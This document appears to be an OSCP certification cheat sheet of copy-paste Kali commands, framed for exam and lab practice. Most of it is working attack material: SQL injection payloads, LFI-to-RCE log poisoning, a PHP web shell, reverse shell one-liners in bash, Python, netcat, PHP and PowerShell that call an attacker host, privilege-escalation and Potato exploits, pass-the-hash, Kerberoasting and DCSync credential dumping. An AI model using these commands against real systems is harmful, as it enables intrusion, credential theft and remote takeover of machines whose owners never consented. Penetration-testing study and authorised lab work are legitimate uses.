# OSCP Cheat Sheets

Quick reference for OSCP exam preparation and exam day. Commands are copy-paste ready for Kali Linux. Keep this document open in a second monitor or as a CherryTree node during practice and exam.

---

## Enumeration Quick Reference

### Nmap One-Liners

```bash
# Initial quick scan (service version detection, open ports only)
nmap -sV --open -oA quick <IP>

# Full port scan (all 65535 TCP ports, fast rate)
nmap -p- --min-rate 5000 -oA full <IP>

# Script scan on discovered ports
nmap -sV -sC -p 22,80,443,3306 -oA targeted <IP>

# UDP scan — top 200 ports (slow, use judiciously)
sudo nmap -sU --top-ports 200 <IP>

# Subnet host discovery (ping sweep)
nmap -sn 10.10.10.0/24

# Vulnerability scripts
nmap --script vuln -p <ports> <IP>

# Combined recommended one-liner for each target
nmap -sV -sC -p- --open --min-rate 5000 -oA scan_<IP> <IP>
```

### Service-Specific Enumeration

```bash
# SMB enumeration
enum4linux-ng -A <IP>
crackmapexec smb <IP> --shares
smbclient -L //<IP> -N
smbmap -H <IP>
nmap --script smb-enum-shares,smb-enum-users -p 445 <IP>

# LDAP enumeration
ldapsearch -x -H ldap://<IP> -s base namingcontexts
ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local"
windapsearch -d domain.local --dc-ip <IP> -U

# Web enumeration
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
nikto -h http://<IP>
whatweb http://<IP>
feroxbuster -u http://<IP> -x php,html,txt

# FTP — check anonymous login
ftp <IP>
# login: anonymous / password: anonymous

# SSH version check (for known CVEs)
nc -vn <IP> 22
ssh -V <IP>

# RPC null session enumeration
rpcclient -U "" -N <IP>
# then: enumdomusers, querydominfo, enumdomgroups
```

---

## Web Application Attacks

### SQL Injection

```sql
# Manual test payloads (login forms, URL params)
' OR '1'='1
' OR '1'='1' --
" OR "1"="1
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' AND 1=CONVERT(int,@@version)--
```

```bash
# SQLmap — GET parameter
sqlmap -u "http://target/page.php?id=1" --dbs --batch

# SQLmap — POST data
sqlmap -u "http://target/login.php" --data "user=admin&pass=test" --dbs --batch

# SQLmap — dump specific table
sqlmap -u "http://target/page.php?id=1" -D database_name -T users --dump

# SQLmap — attempt OS shell
sqlmap -u "http://target/page.php?id=1" --os-shell
```

### File Inclusion

```bash
# Basic LFI test
curl "http://target/page.php?file=../../../../etc/passwd"

# PHP filter wrapper (read source code)
curl "http://target/page.php?file=php://filter/convert.base64-encode/resource=index.php"

# LFI to RCE via log poisoning:
# 1. Inject PHP into User-Agent: <?php system($_GET['cmd']); ?>
# 2. Include Apache access log: ?file=../../../../var/log/apache2/access.log&cmd=id
```

### Web Shells

```php
// Minimal PHP web shell
<?php system($_GET['cmd']); ?>
```

```bash
# Upload + trigger pattern
# 1. Upload shell.php via file upload vulnerability
# 2. Trigger: curl "http://target/uploads/shell.php?cmd=id"
# 3. Upgrade to reverse shell via ?cmd=bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'
```

---

## Privilege Escalation

### Linux PrivEsc Checklist (Ordered by Frequency of Success)

```bash
# 1. Check sudo permissions without password
sudo -l

# 2. SUID binaries → cross-reference with GTFOBins
find / -perm -4000 -type f 2>/dev/null

# 3. Cron jobs — look for writable scripts or PATH injection
cat /etc/crontab
ls -la /etc/cron*
crontab -l

# 4. Linux capabilities
getcap -r / 2>/dev/null

# 5. Writable paths in PATH
echo $PATH
# Check if any directory in PATH is writable

# 6. Processes running as root
ps aux | grep root

# 7. Services listening only on localhost (pivot candidates)
ss -tlnp
netstat -tlnp

# 8. Run linpeas
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 9. Kernel exploits (last resort — can crash the box)
uname -a
cat /etc/os-release
```

GTFOBins reference: <https://gtfobins.github.io>

### Windows PrivEsc Checklist (Ordered)

```powershell
# 1. Token privileges (SeImpersonatePrivilege → Potato attacks)
whoami /priv
whoami /groups

# 2. Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
sc qc <service>

# 3. AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# 4. Service binary paths (DLL hijacking candidates)
wmic service get name,startname,pathname

# 5. Stored credentials
cmdkey /list
dir /s *password* *cred* web.config unattend.xml 2>nul

# 6. Run winPEAS
.\winPEASx64.exe

# 7. PowerUp (PowerSploit)
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

### Potato Attacks Quick Reference (SeImpersonatePrivilege)

```powershell
# PrintSpoofer — works on Server 2016/2019 and Windows 10
.\PrintSpoofer.exe -c "cmd /c whoami > C:\Users\Public\proof.txt"
.\PrintSpoofer.exe -i -c cmd

# GodPotato — newer, works on wider range of Windows versions
.\GodPotato.exe -cmd "cmd /c whoami"

# JuicyPotato — older, specific Windows versions (pre-Server 2019)
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c "{CLSID}"
```

---

## Active Directory Quick Reference

### Enumeration

```bash
# BloodHound collection (from Kali via Impacket)
bloodhound-python -d domain.local -u user -p 'password' -ns <DC-IP> -c All

# BloodHound collection (from Windows host)
# SharpHound.exe -c All --outputdirectory C:\loot

# Find Kerberoastable accounts
GetUserSPNs.py domain.local/user:password -dc-ip <DC-IP> -request

# Find AS-REP Roastable accounts (no pre-auth required)
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip <DC-IP> -format hashcat

# LDAP user enumeration
windapsearch -d domain.local --dc-ip <DC-IP> -U

# SMB sweep across subnet
crackmapexec smb 10.10.10.0/24
crackmapexec smb 10.10.10.0/24 --gen-relay-list targets.txt
```

### Lateral Movement

```bash
# psexec with plaintext credentials
psexec.py domain.local/user:password@<IP>

# Pass-the-Hash with psexec
psexec.py domain.local/user@<IP> -hashes :<NTLM-hash>

# wmiexec (quieter than psexec)
wmiexec.py domain.local/user:password@<IP>
wmiexec.py domain.local/user@<IP> -hashes :<NTLM-hash>

# Evil-WinRM (requires WinRM / port 5985)
evil-winrm -i <IP> -u user -p password
evil-winrm -i <IP> -u user -H <NTLM-hash>

# DCSync (requires replication rights)
secretsdump.py domain.local/user:password@<DC-IP> -just-dc
secretsdump.py domain.local/user:password@<DC-IP> -just-dc-user Administrator
```

### Hash Cracking

```bash
# NTLM hashes
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# NetNTLMv2 (Responder captures)
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

# Kerberoasting TGS (TGS-REP with best64 rule)
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# AS-REP Roasting
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## Pivoting Quick Reference

### SSH Tunneling

```bash
# Local port forward (access internal service from attacker box)
ssh -L 8080:internal-target:80 user@pivot-host

# Dynamic SOCKS proxy (use with proxychains)
ssh -D 1080 user@pivot-host

# Remote port forward (internal host → attacker callback)
ssh -R 4444:127.0.0.1:4444 user@attacker-IP
```

### Chisel (Binary Tunneling — Better for OSCP When SSH Is Unavailable)

```bash
# On attacker box (server, reverse mode)
./chisel server -p 8080 --reverse

# On pivot host (client, reverse SOCKS)
./chisel client <attacker-IP>:8080 R:socks

# Then edit /etc/proxychains.conf — add:
# socks5 127.0.0.1 1080
```

### ProxyChains Usage

```bash
# Route nmap through SOCKS proxy (TCP connect only)
proxychains nmap -sT -Pn -p 22,80,443,445,3389 <internal-IP>

# Route CrackMapExec through the proxy
proxychains crackmapexec smb <internal-subnet>/24

# Route impacket tools
proxychains psexec.py domain/user:pass@<internal-IP>
```

---

## Shells Quick Reference

### Reverse Shell One-Liners

```bash
# Bash
bash -i >& /dev/tcp/<attacker-IP>/4444 0>&1

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker-IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# nc with mkfifo (stable when nc lacks -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <attacker-IP> 4444 >/tmp/f

# PHP
php -r '$sock=fsockopen("<attacker-IP>",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```

```powershell
# PowerShell reverse shell (one-liner, base64 encode for exam)
$client = New-Object System.Net.Sockets.TCPClient("<attacker-IP>",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Shell Upgrades

```bash
# Step 1: Python TTY spawn
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Step 2: Full interactive TTY
# Press Ctrl+Z to background
stty raw -echo; fg
# Then in the remote shell:
export TERM=xterm
export SHELL=/bin/bash
stty rows 40 columns 120
```

### Listeners

```bash
# netcat
nc -lvnp 4444

# pwncat-cs (auto-upgrades shells, persistent)
python3 -m pwncat-cs -lp 4444

# rlwrap + nc (adds readline/arrow-key support)
rlwrap nc -lvnp 4444
```

---

## Exam Day Checklist

- [ ] VPN connected and stable; tested the day before
- [ ] Proctoring software running before exam start time
- [ ] ID verified with proctor
- [ ] CherryTree / Obsidian note template open
- [ ] Nmap, Metasploit database initialized (`msfdb init`), Burp Suite ready
- [ ] Start with AD set enumeration — enumerate ALL targets before exploiting
- [ ] Screenshot `proof.txt` with attacker IP visible for every machine
- [ ] Document findings DURING the exam, not after
- [ ] At 20-hour mark: begin finalizing report notes regardless of remaining machines
- [ ] Verify final point total before ending exam
- [ ] Submit report within 24 hours of exam end time (firm deadline — no extensions)
- [ ] Retain raw screenshots and command outputs in a backup location

---

**Last Updated**: 2026-04-14
**Version**: 1.0
